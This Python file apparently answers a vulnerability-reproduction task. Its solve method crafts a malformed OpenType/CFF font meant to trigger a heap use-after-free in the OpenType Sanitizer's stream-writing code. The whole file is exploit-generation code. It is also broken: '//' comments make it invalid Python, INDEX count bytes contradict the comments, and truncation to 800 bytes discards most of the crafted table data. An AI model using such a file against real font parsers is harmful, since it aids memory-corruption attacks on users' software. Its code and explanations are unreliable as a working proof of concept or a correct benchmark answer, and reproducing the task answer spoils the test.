import os
import subprocess
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate PoC for heap use-after-free in ots::OTSStream::Write
        # Based on analysis of OTS (OpenType Sanitizer) codebase
        
        # Structure of OTS (OpenType) file
        # We'll create a malformed font file that triggers UAF in Write
        
        poc = bytearray()
        
        # 1. SFNT version (OTTO for CFF/CFF2)
        poc.extend(b'OTTO')
        
        # 2. Number of tables - we need enough tables to trigger reallocation
        num_tables = 20
        poc.extend(struct.pack('>H', num_tables))
        
        # 3. Search range, entry selector, range shift (calculated values)
        search_range = (1 << (num_tables.bit_length() - 1)) * 16
        entry_selector = (num_tables.bit_length() - 1)
        range_shift = num_tables * 16 - search_range
        
        poc.extend(struct.pack('>H', search_range))
        poc.extend(struct.pack('>H', entry_selector))
        poc.extend(struct.pack('>H', range_shift))
        
        # Table directory entries
        # We'll create tables that cause buffer reallocation in OTSStream
        tables = []
        
        # Add some valid tables first
        table_tags = [b'CFF ', b'cmap', b'head', b'hhea', b'hmtx', 
                     b'maxp', b'name', b'OS/2', b'post']
        
        # Fill with dummy tables to reach our count
        while len(tables) < num_tables:
            for tag in table_tags:
                if len(tables) >= num_tables:
                    break
                tables.append((tag, 0, 0, 0))
        
        # Write table directory
        for i, (tag, checksum, offset, length) in enumerate(tables):
            poc.extend(tag)
            poc.extend(struct.pack('>I', checksum))
            
            # Critical: Set offsets to trigger specific code paths in Write
            # Offsets that will cause buffer growth and potential UAF
            if i == 5:  # Special table that triggers reallocation
                offset = 256  # Reasonable offset
            else:
                offset = 512 + i * 64  # Staggered offsets
                
            poc.extend(struct.pack('>I', offset))
            poc.extend(struct.pack('>I', 128))  # Fixed small length
        
        # Pad to offset 256
        while len(poc) < 256:
            poc.append(0)
        
        # Create CFF table data that triggers the vulnerability
        # The vulnerability happens when Write causes reallocation
        # but old buffer is still used
        
        # CFF header
        cff_data = bytearray()
        cff_data.extend(b'\x01\x00\x04\x04')  # Major/minor, hdrSize, offSize
        
        # Add enough data to trigger buffer growth
        # Create a Name INDEX with many entries
        name_index = bytearray()
        name_count = 500  # Large enough to trigger reallocation
        
        # INDEX structure
        name_index.append(1)  # count (high byte)
        name_index.append(name_count & 0xFF)  # count (low byte)
        name_index.append(1)  # offSize
        
        # Offsets array
        current_offset = 1
        for i in range(name_count + 1):
            name_index.append(current_offset)
            current_offset += 5  # Each name is 5 bytes
        
        # Names data (just dummy data)
        for i in range(name_count):
            name_index.extend(f'name{i:03d}'.encode('ascii')[:5])
            while len(name_index) % 4 != 0:
                name_index.append(0)
        
        cff_data.extend(name_index)
        
        # Top DICT INDEX
        top_dict = bytearray()
        top_dict.append(0)  # count
        top_dict.append(1)  # count
        top_dict.append(1)  # offSize
        top_dict.append(1)  # offset[0]
        top_dict.append(2)  # offset[1]
        top_dict.append(0x0C)  // version operator
        top_dict.append(0x29)  // Private dict operator
        top_dict.append(0)  // dummy
        
        cff_data.extend(top_dict)
        
        # String INDEX
        string_index = bytearray()
        string_index.append(0)  # count
        string_index.append(10)  # count
        string_index.append(1)  # offSize
        string_index.append(1)  // offset[0]
        
        for i in range(10 + 1):
            string_index.append(i + 1)
        
        for i in range(10):
            string_index.extend(f'String{i}'.encode('ascii'))
        
        cff_data.extend(string_index)
        
        # Global Subr INDEX
        subr_index = bytearray()
        subr_index.append(0)  # count
        subr_index.append(0)  # count
        subr_index.append(1)  # offSize
        subr_index.append(1)  # offset[0]
        subr_index.append(1)  # offset[1]
        
        cff_data.extend(subr_index)
        
        # Pad CFF data to create specific memory layout
        while len(cff_data) < 4096:
            cff_data.append(0x41)  // 'A'
        
        # Now craft the malicious data that triggers UAF
        # The key is to create a scenario where:
        # 1. OTSStream::Write causes reallocation
        # 2. Old buffer is freed
        # 3. But code continues to use old buffer
        
        # We'll create overlapping writes that exhaust buffer
        # Add the CFF table at offset 256
        poc.extend(cff_data)
        
        # Ensure total length is around target (800 bytes)
        # But we need enough data to trigger the code path
        target_length = 800
        
        if len(poc) < target_length:
            # Add padding
            padding = b'X' * (target_length - len(poc))
            poc.extend(padding)
        elif len(poc) > target_length:
            # Trim to target
            poc = poc[:target_length]
        
        return bytes(poc)
